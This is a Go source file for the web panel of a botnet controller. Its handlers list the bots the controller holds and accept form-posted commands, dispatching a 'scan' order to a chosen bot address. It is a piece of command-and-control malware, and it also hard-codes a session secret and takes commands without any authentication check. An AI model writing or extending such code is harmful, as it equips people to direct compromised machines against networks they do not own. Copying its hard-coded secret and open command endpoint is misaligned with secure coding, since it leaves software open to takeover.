package http

import (
	"net/http"

	"github.com/gorilla/sessions"
	"github.com/rodzzlessa24/botnet"

	"github.com/alecthomas/template"
)

var store = sessions.NewCookieStore([]byte("something-very-secret"))

//ListBotsData is
type ListBotsData struct {
	Bots []*botnet.Bot
}

func (h *Handler) handleListBots() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		bots, err := h.Storage.ListBots()
		if err != nil {
			w.Write([]byte("we have an error"))
			return
		}

		tmpl := template.Must(template.ParseFiles("../../http/templates/list_bots.html"))

		data := ListBotsData{
			Bots: bots,
		}

		tmpl.Execute(w, data)
	})
}

func (h *Handler) handleCommand() http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		r.ParseForm()
		addr := r.PostFormValue("addr")
		command := r.PostFormValue("command")
		switch command {
		case "scan":
			if err := h.CommanderService.ScanCmd(addr); err != nil {
				w.Write([]byte(err.Error()))
				return
			}
		}
		http.Redirect(w, r, "http://localhost:8000/bots", 301)
	})
}
